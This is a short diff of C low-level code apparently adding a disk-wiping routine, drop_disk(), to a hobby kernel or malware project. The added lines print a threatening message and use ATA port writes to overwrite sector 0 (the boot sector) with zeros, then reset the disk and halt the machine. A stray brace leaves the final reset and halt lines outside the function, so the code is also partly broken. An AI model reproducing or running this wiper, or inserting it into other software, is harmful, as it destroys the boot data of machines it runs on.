@@ -20,10 +20,21 @@ void print_string(char* str) {
 
 void drop_disk() {
     print_string("\n [!!] FOUND FILES HAVE BEEN MESSED WITH, DOEXSHTHINKAI VOID OF NOTHINGNESS ");
-    asm volitile("
-    mov eax,[0x1000]
-    mov [0x9000], eax
-    ")
+    // 1. Tell the disk we want to write 1 sector to LBA 0
+    outb(0x1F2, 1);          // Sector Count = 1
+    outb(0x1F3, 0);          // LBA Low = 0
+    outb(0x1F4, 0);          // LBA Mid = 0
+    outb(0x1F5, 0);          // LBA High = 0
+    outb(0x1F6, 0xE0);       // Drive selection (Master)
+    outb(0x1F7, 0x30);       // Command 0x30 = "Write Sectors"
+
+    // 2. Send 256 "words" (512 bytes) of 0x0000 to overwrite everything
+    for (int i = 0; i < 256; i++) {
+        // We use outw (Output Word) to send 2 bytes at a time
+        asm volatile ("outw %0, %1" : : "a"((uint16_t)0), "Nd"((uint16_t)0x1F0));
+    }
+}
+   
     outb(0x1F7, 0x08); // ATA Software Reset Command
     asm volatile("cli; hlt"); // Total System Lock
 }
